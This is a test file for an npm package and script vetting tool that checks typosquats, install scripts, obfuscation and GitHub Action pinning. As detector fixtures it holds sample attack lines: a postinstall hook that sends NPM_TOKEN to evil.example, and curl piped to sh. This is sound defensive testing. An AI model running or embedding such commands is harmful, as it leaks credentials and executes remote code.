import { test } from "node:test";
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import {
  POPULAR_PACKAGES,
  hashPackageContents,
  levenshtein,
  vetAction,
  vetPackageContents,
  vetScriptContent,
} from "../dist/vet.js";

// All fixtures are hand-built. No real malware, nothing fetched.

function pkg(overrides = {}) {
  return {
    name: "my-benign-pkg",
    version: "1.0.0",
    packageJson: { name: "my-benign-pkg", version: "1.0.0", license: "MIT" },
    files: {},
    ...overrides,
  };
}

function stripCheckedAt(verdict) {
  const copy = JSON.parse(JSON.stringify(verdict));
  delete copy.manifest.checkedAt;
  return copy;
}

test("levenshtein distances", () => {
  assert.equal(levenshtein("react", "reactt"), 1);
  assert.equal(levenshtein("kitten", "sitting"), 3);
  assert.equal(levenshtein("", ""), 0);
  assert.equal(levenshtein("react", "react"), 0);
});

test("popular packages list is the documented fixed sample", () => {
  assert.equal(POPULAR_PACKAGES.length, 39);
  for (const name of ["react", "lodash", "express", "typescript", "nestjs", "koa"]) {
    assert.ok(POPULAR_PACKAGES.includes(name), `missing ${name}`);
  }
});

test("benign package with no scripts and an MIT license is ALLOW with no findings", () => {
  const verdict = vetPackageContents(pkg());
  assert.equal(verdict.verdict, "ALLOW");
  assert.deepEqual(verdict.findings, []);
  assert.equal(verdict.safeAction, null);
  assert.equal(verdict.manifest.rulesVersion, "2026.10");
  assert.deepEqual(verdict.manifest.signals, ["local"]);
});

test("package content hash is sha256 of sorted concatenated file contents", () => {
  const files = { "b.js": "2", "a.js": "1" };
  const expected = createHash("sha256").update("12", "utf8").digest("hex");
  assert.equal(hashPackageContents(files), expected);
  assert.equal(vetPackageContents(pkg({ files })).artifact.sha256, expected);
});

test("benign postinstall echo is REVIEW, never DENY", () => {
  const verdict = vetPackageContents(
    pkg({
      packageJson: {
        name: "my-benign-pkg",
        version: "1.0.0",
        license: "MIT",
        scripts: { postinstall: "echo done" },
      },
    }),
  );
  assert.equal(verdict.verdict, "REVIEW");
  assert.equal(verdict.findings.length, 1);
  assert.equal(verdict.findings[0].rule, "install-script-present");
  assert.match(verdict.safeAction, /--ignore-scripts/);
});

test("exfil install script (credential read plus network send) is DENY", () => {
  const verdict = vetPackageContents(
    pkg({
      name: "exfil-demo-pkg",
      packageJson: {
        name: "exfil-demo-pkg",
        version: "1.0.0",
        license: "MIT",
        scripts: {
          postinstall:
            "node -e \"fetch('https://evil.example/collect', { method: 'POST', body: process.env.NPM_TOKEN })\"",
        },
      },
    }),
  );
  assert.equal(verdict.verdict, "DENY");
  assert.ok(
    verdict.findings.some((f) => f.rule === "install-script-exfil"),
    JSON.stringify(verdict.findings),
  );
  assert.match(verdict.safeAction, /Do not install/);
});

test("download-and-execute install script is DENY", () => {
  const verdict = vetPackageContents(
    pkg({
      packageJson: {
        name: "my-benign-pkg",
        version: "1.0.0",
        license: "MIT",
        scripts: { postinstall: "curl https://x.example/install.sh | sh" },
      },
    }),
  );
  assert.equal(verdict.verdict, "DENY");
  assert.ok(verdict.findings.some((f) => f.rule === "download-execute"));
});

test("credential plus network inside a scanned .js file is DENY", () => {
  const verdict = vetPackageContents(
    pkg({
      files: {
        "index.js":
          "const t = process.env.NPM_TOKEN; fetch('https://evil.example', { body: t });",
      },
    }),
  );
  assert.equal(verdict.verdict, "DENY");
  assert.ok(verdict.findings.some((f) => f.rule === "file-exfil"));
});

test("typosquat at distance 1 is DENY; the popular name itself is ALLOW", () => {
  const squat = vetPackageContents(pkg({ name: "reactt" }));
  assert.equal(squat.verdict, "DENY");
  assert.ok(squat.findings.some((f) => f.rule === "typosquat"));

  const real = vetPackageContents(pkg({ name: "react" }));
  assert.equal(real.verdict, "ALLOW");
  assert.ok(!real.findings.some((f) => f.rule === "typosquat"));
});

test("missing license is REVIEW, never DENY", () => {
  const verdict = vetPackageContents(
    pkg({
      packageJson: { name: "my-benign-pkg", version: "1.0.0" },
    }),
  );
  assert.equal(verdict.verdict, "REVIEW");
  assert.ok(verdict.findings.some((f) => f.rule === "missing-license"));
});

test("obfuscation combined with a network call is DENY", () => {
  const cases = [
    "eval(atob('aGVsbG8=')); fetch('https://x.example/p');",
    "const s = Buffer.from('aGVsbG8=', 'base64').toString(); eval(s); fetch('https://x.example/p');",
    "eval(String.fromCharCode(104,101,108,108,111,32,119,111,114,108,100)); fetch('https://x.example/p');",
    "const s = '\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48'; fetch('https://x.example/p');",
  ];
  for (const text of cases) {
    const verdict = vetScriptContent({ url: "https://x.example/s.sh", text });
    assert.equal(verdict.verdict, "DENY", text);
    assert.ok(
      verdict.findings.some((f) => f.rule === "obfuscated-network"),
      JSON.stringify(verdict.findings),
    );
  }
});

test("clean action SHA is ALLOW", () => {
  const verdict = vetAction(
    "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683",
  );
  assert.equal(verdict.verdict, "ALLOW");
  assert.deepEqual(verdict.findings, []);
  assert.equal(verdict.safeAction, null);
});

test("mutable action tags are REVIEW with a pin recommendation", () => {
  for (const ref of ["actions/checkout@v4", "actions/checkout@main", "actions/checkout@1.2.3"]) {
    const verdict = vetAction(ref);
    assert.equal(verdict.verdict, "REVIEW", ref);
    assert.ok(verdict.findings.some((f) => f.rule === "action-mutable-tag"));
    assert.match(verdict.safeAction, /Pin.*SHA/);
  }
});

test("latest, untagged, and malformed action refs are DENY", () => {
  for (const ref of [
    "actions/checkout@:latest",
    "actions/checkout@latest",
    "actions/checkout",
    "actions/checkout@",
    "",
    "actions/checkout@v 4",
    "checkout@v4",
  ]) {
    const verdict = vetAction(ref);
    assert.equal(verdict.verdict, "DENY", JSON.stringify(ref));
    assert.ok(verdict.findings.some((f) => f.rule === "action-unpinned"));
  }
});

test("benign script (echo plus grep) is ALLOW with no findings", () => {
  const verdict = vetScriptContent({
    url: "https://x.example/ok.sh",
    text: "echo hello\ngrep foo bar.txt\n",
  });
  assert.equal(verdict.verdict, "ALLOW");
  assert.deepEqual(verdict.findings, []);
  assert.equal(verdict.safeAction, null);
  assert.match(
    verdict.manifest.note,
    /fetched over the network.*analysis was local/,
  );
});

test("malicious script (curl piped to sh) is DENY", () => {
  const verdict = vetScriptContent({
    url: "https://x.example/bad.sh",
    text: "curl https://x.example/install.sh | sh\n",
  });
  assert.equal(verdict.verdict, "DENY");
  assert.ok(verdict.findings.some((f) => f.rule === "download-execute"));
});

test("hidden unicode alone is REVIEW; hidden unicode plus network is DENY", () => {
  const alone = vetScriptContent({
    url: "https://x.example/h.sh",
    text: "echo hello\u200Bworld\n",
  });
  assert.equal(alone.verdict, "REVIEW");
  assert.ok(alone.findings.some((f) => f.rule === "hidden-unicode"));

  const withNet = vetScriptContent({
    url: "https://x.example/h.sh",
    text: "echo hello\u200Bworld\nfetch('https://x.example/data');\n",
  });
  assert.equal(withNet.verdict, "DENY");
  assert.ok(
    withNet.findings.some((f) => f.rule === "hidden-unicode-network"),
  );
});

test("script with an outbound URL but no DENY pattern is REVIEW", () => {
  const verdict = vetScriptContent({
    url: "https://x.example/u.sh",
    text: "echo see https://docs.example/guide for details\n",
  });
  assert.equal(verdict.verdict, "REVIEW");
  assert.ok(verdict.findings.some((f) => f.rule === "outbound-url"));
});

test("script credential plus network is DENY", () => {
  const verdict = vetScriptContent({
    url: "https://x.example/e.sh",
    text: "fetch('https://evil.example', { body: process.env.NPM_TOKEN });\n",
  });
  assert.equal(verdict.verdict, "DENY");
  assert.ok(verdict.findings.some((f) => f.rule === "script-exfil"));
});

test("every finding carries non-empty evidence of at most 120 chars", () => {
  const verdicts = [
    vetPackageContents(
      pkg({
        name: "exfil-demo-pkg",
        packageJson: {
          name: "exfil-demo-pkg",
          version: "1.0.0",
          license: "MIT",
          scripts: { postinstall: "curl https://x.example/i.sh | sh" },
        },
      }),
    ),
    vetPackageContents(pkg({ name: "reactt" })),
    vetPackageContents(pkg({ packageJson: { name: "x", version: "1.0.0" } })),
    vetAction("actions/checkout@v4"),
    vetAction("actions/checkout"),
    vetScriptContent({ url: "https://x.example/h.sh", text: "echo a\u200Bb\n" }),
  ];
  for (const verdict of verdicts) {
    for (const finding of verdict.findings) {
      assert.ok(finding.evidence.length > 0, JSON.stringify(finding));
      assert.ok(finding.evidence.length <= 120, finding.evidence);
      assert.equal(finding.signal, "local");
    }
  }
});

test("determinism: same contents twice give the same verdict except checkedAt", () => {
  const input = pkg({
    name: "exfil-demo-pkg",
    packageJson: {
      name: "exfil-demo-pkg",
      version: "1.0.0",
      license: "MIT",
      scripts: { postinstall: "curl https://x.example/i.sh | sh" },
    },
    files: { "index.js": "module.exports = 1;\n" },
  });
  const first = stripCheckedAt(vetPackageContents(input));
  const second = stripCheckedAt(vetPackageContents(input));
  assert.deepEqual(first, second);
});

test("false-positive probe: 10 benign contents produce zero DENY", () => {
  const probes = [
    vetPackageContents(pkg()),
    vetPackageContents(
      pkg({
        packageJson: {
          name: "my-benign-pkg",
          version: "1.0.0",
          license: "MIT",
          scripts: { postinstall: "echo done" },
        },
      }),
    ),
    vetPackageContents(
      pkg({
        files: { "index.js": "const home = process.env.HOME; console.log(home);\n" },
      }),
    ),
    vetPackageContents(
      pkg({
        files: { "index.js": "fetch('https://api.example/data').then(r => r.json());\n" },
      }),
    ),
    vetPackageContents(
      pkg({
        files: { "index.js": "const x = eval('2 + 2');\n" },
      }),
    ),
    vetPackageContents(pkg({ name: "react" })),
    vetPackageContents(
      pkg({
        packageJson: {
          name: "my-benign-pkg",
          version: "1.0.0",
          license: "MIT",
          scripts: { prepare: "tsc -p ." },
        },
      }),
    ),
    vetScriptContent({ url: "https://x.example/ok.sh", text: "echo hello\ngrep foo bar\n" }),
    vetScriptContent({ url: "https://x.example/u.sh", text: "echo see https://docs.example/guide\n" }),
    vetAction("actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683"),
  ];
  assert.equal(probes.length, 10);
  for (const verdict of probes) {
    assert.notEqual(verdict.verdict, "DENY", JSON.stringify(verdict));
  }
});
